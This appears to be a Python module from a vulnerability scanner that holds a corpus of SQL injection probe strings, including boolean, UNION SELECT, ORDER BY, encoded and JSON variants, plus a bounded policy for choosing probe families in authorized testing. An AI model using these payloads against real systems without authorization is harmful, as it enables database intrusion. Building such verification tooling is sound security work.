"""
VulnForge advanced SQLi verification corpus.

AUTHORIZED TESTING / LOCAL LABS ONLY.

These are verification candidates, not automatic proof.
The verifier must select bounded probes based on observed context
and require baseline/control/differential/repeatability evidence.
"""

SQLI_PAYLOADS = {
    "syntax": [
        "'",
        '"',
        "`",
        "')",
        '")',
        "`)--",
        "'--",
        '"--',
        "`--",
        "' #",
        '" #',
        "'/*",
        '"/*',
        "')--",
        '")--',
        "`)--",
    ],

    "boolean_string": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
        "') AND 1=1--",
        "') AND 1=2--",
        "') OR 1=1--",
        "') OR 1=2--",
        '") AND 1=1--',
        '") AND 1=2--',
    ],

    "boolean_numeric": [
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "1 OR 1=2",
        "1 AND 2>1",
        "1 AND 2<1",
        "1 OR 2>1",
        "1 OR 2<1",
    ],

    "arithmetic": [
        "1+1",
        "1-1",
        "1*1",
        "1/1",
        "1+0",
        "1-0",
        "2*1",
        "2/1",
    ],

    "parentheses": [
        "(1)",
        "(1+1)",
        "(1-1)",
        "' OR (1=1)--",
        "' OR (1=2)--",
        "') OR (1=1)--",
        "') OR (1=2)--",
    ],

    "comments": [
        "'--",
        "'-- -",
        "'#",
        '"--',
        '"-- -',
        '"#',
        "')--",
        "')-- -",
        "')#",
        '")--',
        '")-- -',
        '")#',
    ],

    "union_null": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ],

    "union_integer": [
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
    ],

    "order_by": [
        "1 ORDER BY 1",
        "1 ORDER BY 2",
        "1 ORDER BY 3",
        "1 ORDER BY 4",
        "1 ORDER BY 5",
        "1 ORDER BY 6",
        "1 ORDER BY 7",
        "1 ORDER BY 8",
        "1 ORDER BY 9",
        "1 ORDER BY 10",
    ],

    "context_pairs": [
        "0",
        "1",
        "1'",
        '1"',
        "1)",
        "1')",
        '1")',
        "1 OR 1=1",
        "1 OR 1=2",
        "1 AND 1=1",
        "1 AND 1=2",
    ],

    "search_filter": [
        "test'",
        'test"',
        "test' AND 1=1--",
        "test' AND 1=2--",
        "test' OR 1=1--",
        "test' OR 1=2--",
        "test') AND 1=1--",
        "test') AND 1=2--",
    ],

    "json": [
        '{"id":"1\' AND 1=1--"}',
        '{"id":"1\' AND 1=2--"}',
        '{"name":"test\' AND 1=1--"}',
        '{"name":"test\' AND 1=2--"}',
    ],

    "second_order_markers": [
        "sqli_test_1'",
        'sqli_test_2"',
        "sqli_second_order_1'",
        'sqli_second_order_2"',
    ],

    "encoding": [
        "%27",
        "%22",
        "%60",
        "%2527",
        "%2522",
        "%2527%2520",
        "%2522%2520",
    ],

    "whitespace": [
        "'/**/AND/**/1=1--",
        "'/**/AND/**/1=2--",
        "'/**/OR/**/1=1--",
        "'/**/OR/**/1=2--",
    ],

    "case_variants": [
        "' aNd 1=1--",
        "' aNd 1=2--",
        "' oR 1=1--",
        "' oR 1=2--",
    ],
}


def all_payloads():
    """Return the complete deduplicated corpus."""
    seen = set()
    result = []

    for family, payloads in SQLI_PAYLOADS.items():
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                result.append((family, payload))

    return result


def payload_family(name):
    """Return payloads from one named family."""
    return list(SQLI_PAYLOADS.get(name, []))


# ---------------------------------------------------------------------------
# Bounded adaptive verification policy
# ---------------------------------------------------------------------------

AUTO_SAFE_FAMILIES = (
    "syntax",
    "boolean_string",
    "boolean_numeric",
    "arithmetic",
    "parentheses",
    "comments",
    "context_pairs",
    "search_filter",
    "whitespace",
    "case_variants",
)

LAB_ONLY_FAMILIES = (
    "union_null",
    "union_integer",
    "order_by",
)

MARKER_ONLY_FAMILIES = (
    "second_order_markers",
)

CONTEXT_ONLY_FAMILIES = (
    "json",
    "encoding",
)


def select_verification_families(
    *,
    parameter_type="query",
    observed_value="",
    max_families=3,
):
    """
    Select a small set of payload families.

    This deliberately does NOT return the complete 114-payload corpus.
    The verifier remains bounded and context-aware.
    """

    selected = []

    if parameter_type in {"query", "form", "path"}:
        selected.extend([
            "syntax",
            "boolean_string",
            "search_filter",
        ])

    if parameter_type in {"numeric", "id", "integer"}:
        selected.extend([
            "boolean_numeric",
            "arithmetic",
            "context_pairs",
        ])

    if parameter_type == "json":
        selected.extend([
            "json",
            "boolean_string",
        ])

    # Preserve deterministic ordering and remove duplicates.
    result = []
    for family in selected:
        if family in SQLI_PAYLOADS and family not in result:
            result.append(family)

    return result[:max_families]
